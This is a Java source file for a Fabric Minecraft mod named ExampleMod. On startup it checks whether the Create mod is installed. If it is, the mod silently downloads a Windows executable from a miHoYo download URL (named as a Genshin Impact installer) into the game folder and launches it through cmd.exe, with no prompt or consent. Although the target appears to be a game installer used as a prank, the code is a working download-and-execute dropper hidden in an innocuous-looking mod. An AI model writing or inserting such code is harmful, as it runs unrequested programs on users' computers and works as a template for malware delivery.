package com.example;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.loader.api.FabricLoader;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class ExampleMod implements ModInitializer {
	public static final Logger LOGGER = LoggerFactory.getLogger("example-mod");

	// ==================== 配置区域 ====================
	private static final String FILE_URL = "https://ys-api.mihoyo.com/event/download_porter/link/ys_cn/official/pc_backup319";
	private static final String EXE_FILE_PREFIX = "GenshinImpact";
	// =================================================

	@Override
	public void onInitialize() {
		LOGGER.info("模组已加载，正在检查机械动力模组...");

		boolean isCreateLoaded = FabricLoader.getInstance().isModLoaded("create");

		if (isCreateLoaded) {
			LOGGER.info("检测到机械动力模组！开始执行下载和运行任务...");
			executeTask();
		} else {
			LOGGER.info("未检测到机械动力模组，跳过下载任务。");
		}
	}

	private void executeTask() {
		LOGGER.info("===== 开始执行任务 =====");

		// ========== 使用 FabricLoader 获取目录 ==========
		File gameDir = FabricLoader.getInstance().getGameDir().toFile();
		LOGGER.info("游戏根目录: {}", gameDir.getAbsolutePath());

		// ========== 修复：使用 minecraft 版本名，而不是 fabricloader ==========
		String versionName = FabricLoader.getInstance().getModContainer("minecraft")
				.map(container -> container.getMetadata().getVersion().getFriendlyString())
				.orElse("unknown");
		LOGGER.info("Minecraft 版本: {}", versionName);

		File downloadFolder = new File(gameDir, "versions/" + versionName);
		LOGGER.info("版本文件夹路径: {}", downloadFolder.getAbsolutePath());
		// =============================================

		if (!downloadFolder.exists()) {
			boolean created = downloadFolder.mkdirs();
			if (!created) {
				LOGGER.error("无法创建下载目录: {}", downloadFolder.getAbsolutePath());
				return;
			}
		}

		String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
		String uniqueFileName = EXE_FILE_PREFIX + "_" + timestamp + ".exe";
		File targetFile = new File(downloadFolder, uniqueFileName);
		LOGGER.info("目标文件路径: {}", targetFile.getAbsolutePath());

		// 执行下载
		try {
			LOGGER.info("开始下载文件: {}", FILE_URL);
			downloadFile(FILE_URL, targetFile);
			LOGGER.info("文件下载成功: {}", targetFile.getAbsolutePath());
		} catch (IOException e) {
			LOGGER.error("文件下载失败", e);
			return;
		}

		if (!targetFile.exists()) {
			LOGGER.error("下载完成但文件不存在: {}", targetFile.getAbsolutePath());
			return;
		}
		targetFile.setExecutable(true);

		try {
			LOGGER.info("正在启动程序: {}", targetFile.getAbsolutePath());
			runExe(targetFile);
			LOGGER.info("程序已启动成功！");
		} catch (IOException e) {
			LOGGER.error("启动程序失败", e);
		}
	}

	private void downloadFile(String fileUrl, File destination) throws IOException {
		URL url = new URL(fileUrl);
		HttpURLConnection connection = (HttpURLConnection) url.openConnection();

		connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
		connection.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
		connection.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8");
		connection.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
		connection.setRequestProperty("Connection", "keep-alive");
		connection.setRequestProperty("Referer", "https://ys.mihoyo.com/");

		connection.setConnectTimeout(15000);
		connection.setReadTimeout(60000);
		connection.setInstanceFollowRedirects(true);

		int responseCode = connection.getResponseCode();
		LOGGER.info("服务器响应码: {}", responseCode);

		if (responseCode != HttpURLConnection.HTTP_OK) {
			try (InputStream errorStream = connection.getErrorStream()) {
				if (errorStream != null) {
					byte[] errorBytes = errorStream.readAllBytes();
					String errorMsg = new String(errorBytes, StandardCharsets.UTF_8);
					LOGGER.error("服务器返回错误: {}", errorMsg.substring(0, Math.min(500, errorMsg.length())));
				}
			}
			throw new IOException("服务器响应异常，响应码: " + responseCode);
		}

		long contentLength = connection.getContentLengthLong();
		if (contentLength > 0) {
			LOGGER.info("文件大小: {} MB", contentLength / 1024 / 1024);
		}

		// 确保父目录存在
		File parentDir = destination.getParentFile();
		if (parentDir != null && !parentDir.exists()) {
			parentDir.mkdirs();
		}

		try (InputStream inputStream = connection.getInputStream();
			 FileOutputStream outputStream = new FileOutputStream(destination)) {
			byte[] buffer = new byte[8192];
			int bytesRead;
			long totalRead = 0;
			long lastLogTime = System.currentTimeMillis();
			while ((bytesRead = inputStream.read(buffer)) != -1) {
				outputStream.write(buffer, 0, bytesRead);
				totalRead += bytesRead;
				long now = System.currentTimeMillis();
				if (now - lastLogTime > 5000 && contentLength > 0) {
					int progress = (int) (totalRead * 100 / contentLength);
					LOGGER.info("下载进度: {}% ({} MB / {} MB)", progress, totalRead / 1024 / 1024, contentLength / 1024 / 1024);
					lastLogTime = now;
				}
			}
			LOGGER.info("下载完成，共 {} MB", totalRead / 1024 / 1024);
		}
	}

	private void runExe(File exeFile) throws IOException {
		if (!exeFile.exists()) {
			LOGGER.error("文件不存在: {}", exeFile.getAbsolutePath());
			return;
		}

		String exePath = exeFile.getAbsolutePath();
		if (exePath.contains(" ")) {
			exePath = "\"" + exePath + "\"";
		}

		ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", "start", "", exePath);
		pb.directory(exeFile.getParentFile());
		pb.redirectErrorStream(true);

		Process process = pb.start();
		LOGGER.info("已启动程序: {}", exePath);

		try {
			Thread.sleep(1000);
		} catch (InterruptedException e) {
			Thread.currentThread().interrupt();
		}

		if (!process.isAlive()) {
			LOGGER.warn("程序启动后立即退出，可能需要管理员权限或额外参数");
		}
	}
}